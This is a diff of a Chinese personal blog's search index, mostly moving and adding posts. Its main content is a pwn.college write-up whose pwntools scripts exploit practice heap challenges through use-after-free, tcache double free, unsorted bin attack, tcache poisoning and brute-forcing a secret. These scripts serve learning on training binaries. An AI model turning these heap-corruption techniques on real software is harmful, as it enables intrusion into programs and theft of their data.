-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;/challenge/babyheap_level4.1&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;Function (malloc/free/puts/scanf/read_flag/quit): &#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;malloc&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;439&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"><span class="comment"># get the pointer of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment"># get the location of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = p64(addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer again, make flag allocate here</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;read_flag&#x27;</span>)</span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="babyheap5-0-amp-5-1——unsorted-bin-attack"><a href="#babyheap5-0-amp-5-1——unsorted-bin-attack" class="headerlink" title="babyheap5.0&amp;5.1——unsorted bin attack"></a>babyheap5.0&amp;5.1——unsorted bin attack</h2><p>先考虑没有tcache的情况：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">2</span>, flag_size)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   read_flag()</span><br><span class="line"></span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
-<p>libc 2.23-&gt;libc 2.31</p>
-<p>通过耗尽所有的tcache来触发small bin和unsorted bin，进而修改chunk。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      free(i)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line"></span><br><span class="line">   read_flag()</span><br><span class="line">   free(<span class="number">7</span>)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">7</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">8</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
-<h2 id="babyheap6-0-amp-6-1——tcache-poisoning"><a href="#babyheap6-0-amp-6-1——tcache-poisoning" class="headerlink" title="babyheap6.0&amp;6.1——tcache poisoning"></a>babyheap6.0&amp;6.1——tcache poisoning</h2><p>简单的tcache poisoning</p>
-<p><a href="https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31">https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   scanf(<span class="number">1</span>, p64(sec_addr))</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   puts(<span class="number">1</span>)</span><br><span class="line">   p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">   send_flag(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
-<h2 id="babyheap7-0-amp-7-1——tcache-poisoning2-0"><a href="#babyheap7-0-amp-7-1——tcache-poisoning2-0" class="headerlink" title="babyheap7.0&amp;7.1——tcache poisoning2.0"></a>babyheap7.0&amp;7.1——tcache poisoning2.0</h2><p>由于flag不会变化，secret后半部分，只需将sec_addr+=8，重新运行即可。</p>
-<h2 id="babyheap8-0-amp-8-1——brute-force"><a href="#babyheap8-0-amp-8-1——brute-force" class="headerlink" title="babyheap8.0&amp;8.1——brute force"></a>babyheap8.0&amp;8.1——brute force</h2><p>通过先前的方法可以泄露出secret的后12位，前4位可以通过暴力枚举实现。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">         <span class="keyword">for</span> k <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">               payload = i+j+k+l+<span class="string">&#x27;tlymdcflfbsk&#x27;</span></span><br><span class="line">               send_flag(payload)</span><br><span class="line">               p.recvline()</span><br><span class="line">               <span class="keyword">if</span> <span class="string">b&#x27;Authorized!&#x27;</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">                  <span class="keyword">return</span></span><br><span class="line">               p.recvline()</span><br></pre></td></tr></table></figure>
-<p>脚本跑了一节课才跑出来。</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>博客域名变更小记</title>
     <url>/2022/07/26/newsite.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>因为原先博客域名过长，并且国内解析速度较慢，我决定用利用github学生包白嫖一个域名，并解析到netlify的dns上。最后域名成功由<code>junyu33.github.io</code>变更为<code>junyu33.me</code>.</p>
@@ -1716,6 +1686,42 @@
       <categories>
         <category>test</category>
       </categories>
+  </entry>
+  <entry>
+    <title>pwncollege部分通关记录</title>
+    <url>/2022/07/03/pwn_college.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>指 <a href="https://dojo.pwn.college/challenges">https://dojo.pwn.college/challenges</a> </p>
+<span id="more"></span>
+<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><h2 id="babyheap1-0-2-1——uaf"><a href="#babyheap1-0-2-1——uaf" class="headerlink" title="babyheap1.0~2.1——uaf"></a>babyheap1.0~2.1——uaf</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(flag_size)</span><br><span class="line">   free()</span><br><span class="line">   read_flag()</span><br><span class="line">   puts()</span><br></pre></td></tr></table></figure>
+<h2 id="babyheap3-0-3-1——uaf2-0"><a href="#babyheap3-0-3-1——uaf2-0" class="headerlink" title="babyheap3.0~3.1——uaf2.0"></a>babyheap3.0~3.1——uaf2.0</h2><p>注意tcache是LIFO结构</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   read_flag()</span><br><span class="line">   puts(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="babyheap4-0-amp-4-1——tcache-double-free"><a href="#babyheap4-0-amp-4-1——tcache-double-free" class="headerlink" title="babyheap4.0&amp;4.1——tcache double free"></a>babyheap4.0&amp;4.1——tcache double free</h2><p>第一次独立写出堆题，虽然是最简单的那种<code>tcache double free</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;/challenge/babyheap_level4.1&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;Function (malloc/free/puts/scanf/read_flag/quit): &#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;malloc&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;439&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"><span class="comment"># get the pointer of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment"># get the location of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = p64(addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer again, make flag allocate here</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;read_flag&#x27;</span>)</span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="babyheap5-0-amp-5-1——unsorted-bin-attack"><a href="#babyheap5-0-amp-5-1——unsorted-bin-attack" class="headerlink" title="babyheap5.0&amp;5.1——unsorted bin attack"></a>babyheap5.0&amp;5.1——unsorted bin attack</h2><p>先考虑没有tcache的情况：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">2</span>, flag_size)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   read_flag()</span><br><span class="line"></span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
+<p>libc 2.23-&gt;libc 2.31</p>
+<p>通过耗尽所有的tcache来触发small bin和unsorted bin，进而修改chunk。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      free(i)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line"></span><br><span class="line">   read_flag()</span><br><span class="line">   free(<span class="number">7</span>)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">7</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">8</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
+<h2 id="babyheap6-0-amp-6-1——tcache-poisoning"><a href="#babyheap6-0-amp-6-1——tcache-poisoning" class="headerlink" title="babyheap6.0&amp;6.1——tcache poisoning"></a>babyheap6.0&amp;6.1——tcache poisoning</h2><p>简单的tcache poisoning</p>
+<p><a href="https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31">https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   scanf(<span class="number">1</span>, p64(sec_addr))</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   puts(<span class="number">1</span>)</span><br><span class="line">   p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">   send_flag(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="babyheap7-0-amp-7-1——tcache-poisoning2-0"><a href="#babyheap7-0-amp-7-1——tcache-poisoning2-0" class="headerlink" title="babyheap7.0&amp;7.1——tcache poisoning2.0"></a>babyheap7.0&amp;7.1——tcache poisoning2.0</h2><p>由于flag不会变化，secret后半部分，只需将sec_addr+=8，重新运行即可。</p>
+<h2 id="babyheap8-0-amp-8-1——brute-force"><a href="#babyheap8-0-amp-8-1——brute-force" class="headerlink" title="babyheap8.0&amp;8.1——brute force"></a>babyheap8.0&amp;8.1——brute force</h2><p>通过先前的方法可以泄露出secret的后12位，前4位可以通过暴力枚举实现。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">         <span class="keyword">for</span> k <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">               payload = i+j+k+l+<span class="string">&#x27;tlymdcflfbsk&#x27;</span></span><br><span class="line">               send_flag(payload)</span><br><span class="line">               p.recvline()</span><br><span class="line">               <span class="keyword">if</span> <span class="string">b&#x27;Authorized!&#x27;</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">                  <span class="keyword">return</span></span><br><span class="line">               p.recvline()</span><br></pre></td></tr></table></figure>
+<p>脚本跑了一节课才跑出来。</p>
+<h1 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h1><h2 id="babykernel1-0-6-1"><a href="#babykernel1-0-6-1" class="headerlink" title="babykernel1.0~6.1"></a>babykernel1.0~6.1</h2><p>参照这篇博客：<a href="https://www.cnblogs.com/crybaby/p/14431651.html">https://www.cnblogs.com/crybaby/p/14431651.html</a></p>
+<p>kernel shellcode着实有点麻人。</p>
+<blockquote>
+<p>注：如何查看有没有kaslr？</p>
+<p>进入kernel后，<code>demsg</code>查看第二行最后有没有<code>nokaslr</code></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
   </entry>
   <entry>
     <title>如何打造一个究极舒适的pwn环境</title>
@@ -2275,6 +2281,22 @@
       </tags>
   </entry>
   <entry>
+    <title>Xposed——从入门到放弃</title>
+    <url>/2021/08/10/xp.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>换新手机后，经过两天的不屑努力（与50元解bootloader锁的智商税？）我终于让华为的手机成了我的手机。</p>
+<span id="more"></span>
+<p><img src="/2021/08/10/xp/1.png" style="zoom: 33%;"></p>
+<p>目前还没发现有什么特别的用处，等以后<strong>有技术了</strong>再来填坑。</p>
+]]></content>
+      <categories>
+        <category>develop</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(转载) 《茸雪》讲稿</title>
     <url>/2021/12/19/%E3%80%8A%E8%8C%B8%E9%9B%AA%E3%80%8B%E8%AE%B2%E7%A8%BF.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="《茸雪》讲稿"><a href="#《茸雪》讲稿" class="headerlink" title="《茸雪》讲稿"></a>《茸雪》讲稿</h1><p>反乌托邦的爱情，存在主义的自由、反抗。</p>
@@ -2416,19 +2438,25 @@
       </categories>
   </entry>
   <entry>
-    <title>Xposed——从入门到放弃</title>
-    <url>/2021/08/10/xp.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>换新手机后，经过两天的不屑努力（与50元解bootloader锁的智商税？）我终于让华为的手机成了我的手机。</p>
-<span id="more"></span>
-<p><img src="/2021/08/10/xp/1.png" style="zoom: 33%;"></p>
-<p>目前还没发现有什么特别的用处，等以后<strong>有技术了</strong>再来填坑。</p>
-]]></content>
+    <title>十九——热爱杀105个人的你</title>
+    <url>/2021/07/09/%E5%8D%81%E4%B9%9D.html</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="94c178d8444f654825ecd7ac9d68343b0f2e09fbd724e4a7c94fb1dc93f2115f">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec32d5f036c78c189b8c30cd311f0c44bcdf9ddedfd6c66bfdfc2bb4a0a23eb7a62d13e83184952540545ea7150454871ae24d80818cfeeb6aa2471f860b72b98c56bbbd4702503971a324dd6df6dd21507ec37799310b591df3f60c43021e13c24c306c1bd047d188eda2c534bb899685046131a268390326c442e9b92300fba7c5e795cd9656b2583900e08e83af6cdebba87ed3eb840c9a0930d0840b98b55775745e3a51ed3b8799fc0fb35ba9aaa30609febde5b587e16d318882d844c49395260b433fbcad4aa40ee1c13c8c92c11b2ffc9ff0ffc6ef3a954b2eba60d60d4fe83175fdb345cfb5237817cd30cafe08b03688ccfe29ee92a4b0983a7250cf3a3b5a7714b5b7b9ea10a8551d6169a1e264e2d875e05a5bc06775052f8b54db8fbc867406ca28a0d25bc6ceb75fbe69a81ccf0b8a46b7b1cafbacdd2d4440409bacd5a5ca47a6cd63e6bdf00f5b12ae625048224e45096089475d2a3bf009fedf0c2509f4d376c15546d6d11b1c557ae8ac7bf3eccc6ef48d0089031334044ce468d18ba98e17391209acafa85bbd84a9373a347c43da6169cc7afc6984d75600760b79ddb00c737934ac7e1421099ed2fcbe13777cb89fe74095bc790d5359848bc78dd8b53f57b15c3e9bf6d5e2fd13771d13c8c805823f6a3ac020a9f226ae7389800f5698cd1603697c83fbd3b0821a0f4917f11dbf7f50a7b9d2a8d05567578766b8c999adbff17736abaa0c239212d3b7b2d46e868408e2a066e5a75a7df09490dd6bf960a230dd647a4551e4134001bfffbe4d3d93436f0acfa477515cb2ca9db2aef73d9ecbe48ff710c7af184e16e371803d9d513c23fe8e2b781fd956299900b65ebed0f8d9f9440386f9f53daac08c932422f9fda4bdd50719ef716b39f2b72e4daccc4ea52bcf1e9f80acf551db813ef2c57e4bef4a4731b754e30476ce41e668f69be2a39ed124dee0305407cd00a8c7437c7a2aa7704718d9f891643614acfd40d6433f6489f6ddf3f9e7eb8c53ff6236558df5c90ac63c6f4b2e3365eb01313290a88670e8c5e9e1e06a484b389bea41673f315347ff37348a5dce8d855a37409fe38c6c4627de1fd0622669e618ee20873e01d0b11c7a854ad52968c5b3b5b88fb8d9ce2f828f9c94affc17cdc1801d6dc3055adc1088f28f02e90d985febb92204c39e88e61c855a400543de14d7177d7c96916b95cd2ca540b4bfaf05862ca8703be44dfeb8c6b5f14cb4419cc28d5183dc8a004c9add7f843d8561effc7fe1221c10decba0e2b54c45d332ff756b3fa2cc4ab22c2618d947a37d8ccf74512a19c42b810d72bcfec4d23c86cae1788108b907d4eaf3a8a5a0d3963a7069d6ce2c2774a6cf1425b5f12edd73f3b1d0783c35fb3f7c5c4b827681339f633e3e8493dd80feed98fe524a3523cf425ddb389e55e53de2083451f40376b6a229730db2886d8ca18f20852fa626ee415fab94a1c4dd1b82da6b19f466eb81594f5398979cef96d790e24261944a5100523a8c79b4286f93e51c95c16132a43d3bf2a6dfebec61dd7fa4d6c1d4b7f2bc218d2db30cf6a8874dd66a27f4c14f57ea4765b025f1a56f565f3f445df510cb1547a8af694bdf9184683b4e08cf1cdd4152dcdd88a8e0b218bf4bb264bc8f5ebe0ea7b601041990a4375ea19a256808ea0057d187947249c742596ec322924313866e290d5f41b4ad4ea6d9c87cf0906cc782b6d2a3d236450aed0475a8b27c5844879674d47f3f9a7572a32a4316f32c5f51a14c42d0eec47ff46e6c8127df6d06acb5e17cc7dbca3a9fb0a5ef0c12148ad88580cfd1c827e5db80f0a9ddd0b7f1143d3656c62b0aa6bb7d58c7ef3bc05a402dd9dcb86fac2f64cbb6a31c433e9c1c25f64a1923aa521b573ef26f00f7d403cb90ae3369008af56ec5124f00226881f4032eb7721a184c3b4d6f138e504b5a090eefd957c6a15f2002b37546f7cf8599840049f8b45f4881d276a11e821ecd07bbd79feb12031f1f07c7f863fabb3c4183b2922818ccc4f72ac1b32e8a8ad9d7ae5ea0120d6d5e46aefbe859b2652a6be4eaaafa63152ace1ef535fc1cfc3cf618fed176e8c7ae14387181d01f8d86ace5b0ebec37a3aec1d359b11c6f031a2d41a1ddaeba8f66aa101047944f8c007853aefa0e2f898e7718d1fe924def4e31d17a7632ef0fe93d4bef9d3b077345f5b5f047c96283e6aade5ab6a74d95f34575c21c53799cddb704509e2563bd9d5b289d08f6654981371993e5fa149a36c3c3a4fd0e2e0c355a669f3956389fc4f8e85cb5f5dc0d81bb21ce3b6db99aa8b96dd80f9b4ddf0b4d02f5d16bd82501f4c2c331c64a81c9fdc94713915bf68bdfcb58dc899c7f7eb221731c12db7825300bf3be5f47fcbafe603ee557645f8ea2ef5b7f04af981883b38c36b00827bb1da549beea10c3e30bfb085c91bb7dc37b1d5c944cfb9792aeb824ecf0ec230f57c1cdb7f3117b83ec7fa837ac07901b4d50e398a0afa80653d425f1d0e090e1de715d24a92241e7a261a765a53e0c06069704070f255b129ad29d6b77bb6f25ffb5177dd2bf7dbb7615cd51df4dc16e5234aebcc87b014c4660cd41cfa27711441c52e485aa6debd518150ce120ea905f5acf12504967c36573e28b1fc679d6f99b7c1db0aa2c7506b36c80a37681239852d49d61063c11658cad1244f9ceafc18fc230fcb119cbccff91f8dece36225d24a7b8e7c860663321a05f7d1f9fd06e0d3b22dec429c8fbdef0e896bdf60a5a66dd395fae4d4633323e1334f26da1901ed3921ba5dd172b7a5121c9c11325153574ecf983799cfea9a3ff33ac2ea933753c6fcb7fa84c0dd29fc15321672fa70ed8fc539c387538a209b1d255258cf09f7ebb989c8313c76c73f44cb1341a56eda95dbfd517ba5f7b4e4d23617705ff7c6dd35f0dafe201161ed85933adbf0e5005a4ea8ce273ea411dbe12c31f951ba52af87c72c004714e5c960bf1dac643cfb6899c06b4ad049d7bc091e89caa91925cdcec615c679aba6e093aca1565966ff003c696efa0b55c1f7d06e46d2390b99bac7bab0d562b2ada02ecad709f8a005b55ddc170e76baadba583254c98c5c555159f959ae8b436823242e9927d283b1f890140297bff1d3d4ba5e70ca7014f75b62fb514486d475ea12ea7f7385c4a3b50d6c3e1ee7380597d2a5e13e4cd608344a85265b1fc25bedefe35e4fb28c73c40ce93af66c9df52bb807baf52ae0a3c4340c6ddfc603ef5137d2f412022a4b656d0f1e476dd780d46da2ba44140c2e86340f5a4468eea8ffd779679c932d125196c37b576458981ca5166a03ac139a8661b0c6b4f2d9ca055be6cfaf5a7c77c991f52749966497fe4d9f2b266b36fc1f6c9807867336f95800bb3f1b4b750e3fcd5e82f5a765e569de32d23fe6316907157101deaf73bc42c0b4e52cba55d8bd1c8321089782e66fe4d2d2dcd69378b38f38916471864636aa30eb1096b4d57371ee8fff2b9baa9640cf7633e235fa675ef3c7dd645e39e9fe3c5102ed7cc5925ded9b29edccc23f8eab94e9dac8630ce2d5c03ceff59a0f695a12efb0c5ad41a3c82b098e2c0e5201ec23239848c5f4e34e4646a91799043f8325f193de60b7a0289b77890c7c93e36e003ee26759b39368fd862c849f1500c53cbdf8d4e19dd6037d7f11632024decc9b7fb3e761d153a0c5469960e6c0fc8b1b0541d7fe813a1a0681e9d12b97a64eaf301795108563f7668550320c7daa7885f859e2800f9a46c3b6a2dbd0af63d1235158c60466a8ebec1a396ae37af9b985ac27e6772c4d976dadad097c16207030f27500b2df15c23551df53f87b6afe81c43982e34257bfd3880e9236ea05132e194a1ae8913c5000c8c8c16f8dd1b4a0b2bca4c673106ea63248811c363bff3fffeca60e48a0f2f66388b4996bdc6a8040825d4ba3e1253ae8c97a6f70fb24448dc027f8f57982b1b2482d8feb4ee0a47c8cc6d30ee052b54d5406867e40f0c94c3a306661819adbd7b9cb827f06d983d69e0bfb70146305ea05b6b371b321db9a926a1ef3fa2e8b5f23558091d137ff27aa7d3925a86f833c5f1f2b67fd81268d66b0db1758bdf5f90b13f5f39c0febb3f54bc302944b41110496f6a727fccd9f176caed752720d265567e4f1c22e685ac6ccdd7b0b1d2e63432a7ebaefbc9750865ecb1c1ef22d6cc79b1d9787d316c02a1001dfc68d1c9f0effb1be992de21107d1c364c0b1deb43228ee10561b2f28b61b2f07f0b19788f527ee189fe984b55a57005cc4df743fe79873c2d202a990cd28c5068c1493cc5ccc4bbc16407015ecfb724dca2ded3ac3ee15075e9b1edaabe1b20104df155d457265550bc770f150d4b1c7ce4166008de92c2991d391b3f64c5312990cfdf4273260736730fe3e216c88bcf7c8bb37dfd0c442b01ad6b3272e3fd6a2c5af3d06c19596615eaa893fc0f45719419f15f561bd13732c99978468f0f80aca8b180368a389520a34b2c850b81a5de068baf932f3de48950a538cfd4cb3310c404a1be9749fe147437d52e564a7826e3ffaba80d1359a8447cc0918f0e12efc8e07ee95bceceb8b21dcf0ebf1188e958e4e7e74f173a2fcc39d2811d8c2c39ffc1c7a3f275e51f4fda282adb96f12c528d3856325623dd5960dc47151d41a1d0358254de758099bd09a1f9ff66273701733bb17b5d87358d3353c3b51060b570c1a9e0c53b4f235a0d4825028b79d63b5b80186d924e24ee08ab99dfdfcc405b9358fd0c99cae94082171095b6a39a